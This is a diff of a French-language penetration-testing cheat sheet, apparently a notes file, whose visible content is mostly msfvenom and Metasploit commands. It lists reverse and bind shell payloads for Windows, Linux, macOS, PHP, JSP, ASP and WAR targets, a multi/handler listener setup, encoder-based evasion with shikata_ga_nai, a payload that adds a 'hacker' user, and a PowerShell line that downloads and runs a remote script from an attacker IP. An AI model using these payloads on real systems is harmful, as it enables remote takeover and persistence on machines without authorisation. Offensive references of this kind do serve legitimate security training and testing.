@@ -20,6 +20,7 @@ Examiner les entrées et les réponses de l'application web.
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f powershell -v sc
+
 ```
 
 
@@ -67,6 +68,7 @@ $win32Functions::CreateThread([IntPtr]::Zero, 0, $allocatedMemory, [IntPtr]::Zer
 while ($true) {
     Start-Sleep 60;
 }
+
 ```
 
 
@@ -137,6 +139,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 ```
 
 
@@ -147,6 +150,7 @@ if __name__ == "__main__":
 
 ```text
 apt-cache search shellter && sudo apt install shellter
+
 ```
 
 
@@ -154,6 +158,7 @@ apt-cache search shellter && sudo apt install shellter
 
 ```bash
 sudo apt install wine
+
 ```
 
 
@@ -161,6 +166,7 @@ sudo apt install wine
 
 ```text
 dpkg --add-architecture i386 && apt-get update && apt-get install wine32
+
 ```
 
 
@@ -168,6 +174,7 @@ dpkg --add-architecture i386 && apt-get update && apt-get install wine32
 
 ```text
 msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST [IP];set LPORT [PORT];run;"
+
 ```
 
 
@@ -180,6 +187,7 @@ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse
 sudo msfdb init
 sudo systemctl enable postgresql
 sudo msfconsole
+
 ```
 
 
@@ -187,6 +195,7 @@ sudo msfconsole
 
 ```text
 workspace -a [nameToGive]
+
 ```
 
 
@@ -194,6 +203,7 @@ workspace -a [nameToGive]
 
 ```text
 search type:auxiliary smb
+
 ```
 
 
@@ -201,6 +211,7 @@ search type:auxiliary smb
 
 ```text
 services -p 445 --rhosts
+
 ```
 
 
@@ -215,6 +226,7 @@ msfvenom -p [PAYLOAD] --list-options
 
 # Payload encoding
 msfvenom -p [PAYLOAD] -e [ENCODER] -f [FORMAT] -i [ENCODE] [COUNT_OF_ENCODING] LHOST=[IP] LPORT=[PORT]
+
 ```
 
 
@@ -236,6 +248,7 @@ msf> set ExitOnSession false
 msf>exploit -j
 
 # Pour obtenir plusieurs sessions sur un seul multi/handler, vous devez définir l'option ExitOnSession à faux et lancer l'exploit -j au lieu de simplement l'exploit; l'option -j est de garder toute la session connectée en arrière-plan.
+
 ```
 
 
@@ -285,6 +298,7 @@ msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py
 
 # WAR
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
+
 ```
 
 
@@ -298,6 +312,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.wa
 
 ```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
+
 ```
 
 
@@ -308,6 +323,7 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell
 
 ```bash
 msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
+
 ```
 
 
@@ -318,6 +334,7 @@ msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.el
 
 ```bash
 msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
+
 ```
 
 
@@ -328,6 +345,7 @@ msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
 
 ```bash
 msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
+
 ```
 
 
@@ -338,11 +356,14 @@ msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
+
 ```
 
 
 ```bash
+# Générer une charge utile avec msfvenom
 msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe
+
 ```
 
 
@@ -353,6 +374,7 @@ msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="
 
 ```bash
 msfvenom -p windows/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f exe > shell.exe
+
 ```
 
 
@@ -363,6 +385,7 @@ msfvenom -p windows/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f exe > shell.exe
 
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
+
 ```
 
 
@@ -373,6 +396,7 @@ msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
+
 ```
 
 
@@ -383,6 +407,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
 
 ```bash
 msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
+
 ```
 
 
@@ -393,6 +418,7 @@ msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
 
 ```bash
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho
+
 ```
 
 
@@ -403,6 +429,7 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho
 
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho
+
 ```
 
 
@@ -413,6 +440,7 @@ msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho
 
 ```bash
 msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py
+
 ```
 
 
@@ -423,6 +451,7 @@ msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py
 
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh
+
 ```
 
 
@@ -433,6 +462,7 @@ msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh
 
 ```bash
 msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl
+
 ```
 
 
@@ -443,6 +473,7 @@ msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp
+
 ```
 
 
@@ -453,6 +484,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.a
 
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp
+
 ```
 
 
@@ -463,6 +495,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp
 
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
+
 ```
 
 
@@ -473,6 +506,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
 
 ```bash
 msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php cat shell.php
+
 ```
 
 
@@ -483,11 +517,14 @@ msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php c
 
 ```bash
 msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php
+
 ```
 
 
 ```bash
+# Générer une charge utile avec msfvenom
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('[http://IP/nishang.ps1')\](http://ip/nishang.ps1')%5C)"" -f python
+
 ```
 
 
@@ -498,6 +535,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Obj
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x04\xA0"
+
 ```
 
 
@@ -508,6 +546,7 @@ msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c 
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b "\x04\xA0"
+
 ```
 
 ---
